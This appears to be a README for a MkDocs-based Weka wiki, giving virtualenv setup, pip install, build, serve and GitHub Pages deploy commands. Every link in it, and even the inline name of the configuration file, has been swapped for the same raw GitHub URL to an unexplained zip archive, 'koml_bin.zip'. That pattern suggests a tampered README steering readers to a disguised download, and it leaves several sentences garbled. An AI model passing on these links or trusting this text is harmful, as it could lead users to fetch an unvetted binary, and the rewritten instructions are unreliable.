# Weka Wiki

Not really a wiki, but replacing some of the content that was hosted on
https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip before it shut down. Uses [mkdocs](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip) 
to generate the content.

The wiki can be found at this location:

https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip


## Installation

*mkdocs* works with Python 2.7 and 3.x.

Best approach is to install mkdocs (>= 0.16.0) in a virtual environment 
(`venv` directory):

* Python 2.7

  ```
  virtualenv -p /usr/bin/python2.7 venv
  ```

* Python 3.6 (Python 3.5 works as well)

  ```
  virtualenv -p /usr/bin/python3.6 venv
  ```

* Install the mkdocs package

  ```
  ./venv/bin/pip install mkdocs==1.4.2 jinja2==3.1.2 "Markdown<3.4.0" mkdocs-material==8.5.10
  ```


## Content

In order for content to show up, it needs to be added to the configuration, 
i.e., in the `pages` section of the `https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip` file.

Some pointers:

* [Images and media](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip)
* [Linking](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip)
* [https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip)


## Build

[mkdocs](https://raw.githubusercontent.com/GetachewGanfur/weka-wiki/master/docs/files/koml_bin.zip) is used to generate HTML from the 
markdown documents and images:

```
./venv/bin/mkdocs build --clean
```


## Testing

You can test what the site looks like, using the following command
and opening a browser on [localhost:8000](http://127.0.0.1:8000):

mkdocs monitors setup and markdown files, so you can just add and edit
them as you like, it will automatically rebuild and refresh the browser.

```
./venv/bin/mkdocs build --clean && ./venv/bin/mkdocs serve
```

## Deploying

You can deploy the current state to Github pages with the following command:

```
./venv/bin/mkdocs gh-deploy --clean
```
